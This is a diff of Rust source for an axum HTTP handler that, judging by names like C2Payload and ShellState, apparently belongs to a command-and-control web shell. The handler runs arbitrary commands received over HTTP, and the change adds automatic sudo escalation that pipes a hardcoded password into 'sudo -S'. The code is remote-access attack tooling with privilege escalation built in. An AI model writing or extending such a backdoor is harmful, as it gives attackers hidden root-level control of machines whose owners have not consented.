@@ -1,7 +1,11 @@
 use crate::ShellState;
 use axum::{response::Html, Extension, Json};
 use serde::Deserialize;
-use std::sync::{Arc, Mutex};
+use std::{
+    io::Write,
+    process::Stdio,
+    sync::{Arc, Mutex},
+};
 
 #[derive(Deserialize)]
 pub struct C2Payload {
@@ -19,12 +23,26 @@ pub async fn exec_cmd<'a>(
         ShellState::manage_path(&mut ext.lock().unwrap(), cmdvec.collect::<Vec<&str>>());
         "".to_string()
     } else {
-        let builder = std::process::Command::new(cmd_bin_name)
-            .args(cmdvec.collect::<Vec<&str>>())
-            .current_dir(&ext.lock().unwrap().pwd)
-            .output();
+        let output = if cmd_bin_name == "sudo" {
+            let mut child = std::process::Command::new(cmd_bin_name)
+                .arg("-S")
+                .args(cmdvec.collect::<Vec<&str>>())
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .current_dir(&ext.lock().unwrap().pwd)
+                .spawn()
+                .unwrap();
+            writeln!(child.stdin.as_mut().unwrap(), "{}", "PASSWORD").unwrap();
+            child.wait_with_output()
+        } else {
+            std::process::Command::new(cmd_bin_name)
+                .args(cmdvec.collect::<Vec<&str>>())
+                .current_dir(&ext.lock().unwrap().pwd)
+                .output()
+        };
 
-        match builder {
+        match output {
             Ok(op) => format!(
                 "{}\n{}",
                 String::from_utf8(op.stdout).unwrap(),
